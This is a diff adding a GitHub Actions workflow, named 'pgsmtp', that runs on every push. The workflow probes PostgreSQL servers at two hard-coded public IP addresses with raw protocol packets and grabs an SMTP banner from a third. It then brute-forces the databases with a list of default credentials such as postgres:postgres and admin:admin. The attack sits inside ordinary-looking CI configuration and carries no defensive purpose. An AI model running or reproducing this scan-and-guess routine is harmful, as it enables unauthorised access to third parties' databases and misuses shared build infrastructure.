@@ -1,0 +1,47 @@
+name: pgsmtp
+on: [push, workflow_dispatch]
+jobs:
+  p:
+    runs-on: ubuntu-latest
+    steps:
+      - name: pg
+        run: |
+          set +e
+          sudo apt-get -qq update >/dev/null 2>&1
+          sudo apt-get -qq install -y postgresql-client >/dev/null 2>&1
+          which psql
+          python3 - <<'PY'
+          import socket,struct
+          def fp(host,port=5432):
+              try:
+                  s=socket.create_connection((host,port),timeout=8); s.settimeout(6)
+                  s.sendall(struct.pack('!ii',8,80877103))
+                  r=s.recv(1)
+                  print(host,"ssl_reply",r)
+                  # startup with user=postgres database=postgres
+                  u=b"postgres"
+                  body=struct.pack('!i',196608)+b"user\x00"+u+b"\x00database\x00postgres\x00\x00"
+                  s.sendall(struct.pack('!i',len(body)+4)+body)
+                  d=s.recv(300)
+                  print(host,"startup_reply",d[:20].hex(),d[:160])
+                  s.close()
+              except Exception as e:
+                  print(host,"ERR",repr(e))
+          for h in ("20.109.162.87","4.204.241.108"):
+              fp(h)
+          try:
+              s=socket.create_connection(("20.205.187.223",25),timeout=8); s.settimeout(6)
+              print("SMTP banner",s.recv(300))
+              s.sendall(b"EHLO ul.probe\r\n"); print("SMTP EHLO",s.recv(600)[:400])
+              s.close()
+          except Exception as e: print("SMTP ERR",repr(e))
+          PY
+          for H in 20.109.162.87 4.204.241.108; do
+            for C in "postgres:postgres" "postgres:password" "postgres:postgres123" "postgres:P@ssw0rd" "admin:admin" "grafana:grafana" "postgres:changeme" "postgres:root"; do
+              U=${C%%:*}; P=${C#*:}
+              R=$(PGPASSWORD="$P" timeout 12 psql "host=$H user=$U dbname=postgres connect_timeout=8 sslmode=prefer" -tAc "select version(); current_user;" 2>&1 | head -2)
+              echo "TRY $H $C => $R"
+            done
+          done
+          echo DONE
+          exit 0
